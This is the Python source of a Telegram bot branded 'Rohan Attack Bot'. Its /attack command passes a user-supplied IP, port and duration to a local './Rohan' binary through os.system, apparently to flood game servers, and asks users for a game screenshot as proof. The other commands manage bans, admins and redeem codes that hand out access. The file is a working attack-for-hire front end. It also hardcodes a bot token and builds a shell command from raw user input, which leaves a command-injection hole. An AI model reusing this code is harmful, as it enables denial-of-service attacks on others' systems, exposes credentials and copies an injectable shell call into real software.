import asyncio
import os
import datetime
import random
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

# Owner ID (Replace with your Telegram ID)
OWNER_ID = "1866961136"

# Data storage
banned_users = {}
admins = []
ongoing_attacks = {}
redeem_codes = {}

# Load banned users
def load_data():
    try:
        with open("banned_users.txt", "r") as f:
            for line in f:
                user_id, reason = line.strip().split(":")
                banned_users[user_id] = reason
    except FileNotFoundError:
        pass

load_data()

print("Bot Starting...")

# /start command
async def start(update: Update, context: CallbackContext):
    welcome_message = """👋 **Welcome to Rohan Attack Bot!**  
🚀 Use `/help` to see all available commands.  
⚠️ Misuse of the bot will result in a **ban**.  
✅ Stay within the guidelines and have fun!"""
    await update.message.reply_text(welcome_message)

# /attack command
async def attack(update: Update, context: CallbackContext):
    user_id = str(update.message.from_user.id)

    if user_id in banned_users:
        await update.message.reply_text("🚫 You are banned from using this bot.")
        return

    args = context.args
    if len(args) != 3:
        await update.message.reply_text("⚠️ Usage: /attack <ip> <port> <duration>")
        return

    ip, port, duration = args
    duration = int(duration)
    start_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    os.system(f"./Rohan {ip} {port} {duration}")
    await update.message.reply_text(f"⚔️ Attack started on {ip}:{port} for {duration} sec!\n🕒 **Start Time:** `{start_time}`")

    for remaining in range(duration, 0, -1):
        await asyncio.sleep(1)
        if remaining % 10 == 0 or remaining <= 5:
            current_time = datetime.datetime.now().strftime("%H:%M:%S")
            await update.message.reply_text(f"⏳ **Time Left:** {remaining} sec\n🕒 **Current Time:** `{current_time}`")

    await update.message.reply_text("✅ Attack Ended!\n📸 Please send a screenshot of the game!")

    ongoing_attacks[user_id] = True
    await asyncio.sleep(120)

    if ongoing_attacks.get(user_id):
        banned_users[user_id] = "Failed to provide proof"
        del ongoing_attacks[user_id]
        await update.message.reply_text(f"🚫 {update.message.from_user.first_name} has been banned for not sending proof!")

# Handle feedback (photo)
async def handle_photo(update: Update, context: CallbackContext):
    user_id = str(update.message.from_user.id)

    if user_id in ongoing_attacks:
        del ongoing_attacks[user_id]
        await update.message.reply_text("✅ Thank you for your feedback!")

# /banned_users command
async def banned_users_list(update: Update, context: CallbackContext):
    if not banned_users:
        await update.message.reply_text("✅ No banned users.")
        return

    msg = "🚫 **Banned Users:**\n"
    for user_id, reason in banned_users.items():
        msg += f"👤 `{user_id}` - {reason}\n"
    
    await update.message.reply_text(msg)

# /unban command
async def unban(update: Update, context: CallbackContext):
    if str(update.message.from_user.id) != OWNER_ID:
        await update.message.reply_text("🚫 Only the owner can unban users.")
        return

    if not context.args:
        await update.message.reply_text("⚠️ Usage: /unban <user_id>")
        return

    user_id = context.args[0]

    if user_id in banned_users:
        del banned_users[user_id]
        await update.message.reply_text(f"✅ User `{user_id}` has been unbanned.")
    else:
        await update.message.reply_text("🚫 User not found in banned list.")

# /add_admin command
async def add_admin(update: Update, context: CallbackContext):
    if str(update.message.from_user.id) != OWNER_ID:
        await update.message.reply_text("🚫 Only the owner can add admins.")
        return

    if not context.args:
        await update.message.reply_text("⚠️ Usage: /add_admin <user_id>")
        return

    user_id = context.args[0]
    if user_id in admins:
        await update.message.reply_text("✅ User is already an admin.")
    else:
        admins.append(user_id)
        await update.message.reply_text(f"✅ User `{user_id}` added as an admin.")

# /remove_admin command
async def remove_admin(update: Update, context: CallbackContext):
    if str(update.message.from_user.id) != OWNER_ID:
        await update.message.reply_text("🚫 Only the owner can remove admins.")
        return

    if not context.args:
        await update.message.reply_text("⚠️ Usage: /remove_admin <user_id>")
        return

    user_id = context.args[0]
    if user_id in admins:
        admins.remove(user_id)
        await update.message.reply_text(f"✅ User `{user_id}` removed from admin list.")
    else:
        await update.message.reply_text("🚫 User is not an admin.")

# /generate_redeem command
async def generate_redeem(update: Update, context: CallbackContext):
    if update.message.chat.type == "private":
        await update.message.reply_text("⚠️ Code generation is for group admins only.")
        return

    if str(update.message.from_user.id) not in admins:
        await update.message.reply_text("🚫 Only admins can generate a redeem code.")
        return

    code = f"Rohan-{random.randint(1000, 9999)}"
    redeem_codes[code] = update.message.chat.id
    await update.message.reply_text(f"✅ **Redeem Code Generated:** `{code}`")

# /redeem command
async def redeem(update: Update, context: CallbackContext):
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /redeem <code>")
        return

    code = context.args[0]

    if code in redeem_codes:
        group_id = redeem_codes[code]

        if update.message.chat.type == "private":
            await update.message.reply_text("✅ Redeem successful! You now have access.")
            del redeem_codes[code]
        elif update.message.chat.id == group_id:
            await update.message.reply_text("✅ Code applied! All members in this group have access.")
            del redeem_codes[code]
        else:
            await update.message.reply_text("🚫 Invalid redeem code for this group.")
    else:
        await update.message.reply_text("🚫 Invalid redeem code.")

# /help command
async def help_command(update: Update, context: CallbackContext):
    commands = """
📌 **Available Commands**
/start - Start the bot
/attack <ip> <port> <duration> - Start an attack
/redeem <code> - Redeem access
/generate_redeem - Generate a code (Admin Only)
/add_admin <user_id> - Add an admin (Owner Only)
/remove_admin <user_id> - Remove an admin (Owner Only)
/banned_users - Show banned users
/unban <user_id> - Unban a user (Owner Only)
    """
    await update.message.reply_text(commands)

# Add handlers
app = Application.builder().token("7898888817:AAHfJQUBpUyxj2LS0v6XZ-ufQok262RPJ70").build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("attack", attack))
app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
app.add_handler(CommandHandler("banned_users", banned_users_list))
app.add_handler(CommandHandler("unban", unban))
app.add_handler(CommandHandler("add_admin", add_admin))
app.add_handler(CommandHandler("remove_admin", remove_admin))
app.add_handler(CommandHandler("generate_redeem", generate_redeem))
app.add_handler(CommandHandler("redeem", redeem))
app.add_handler(CommandHandler("help", help_command))

app.run_polling()
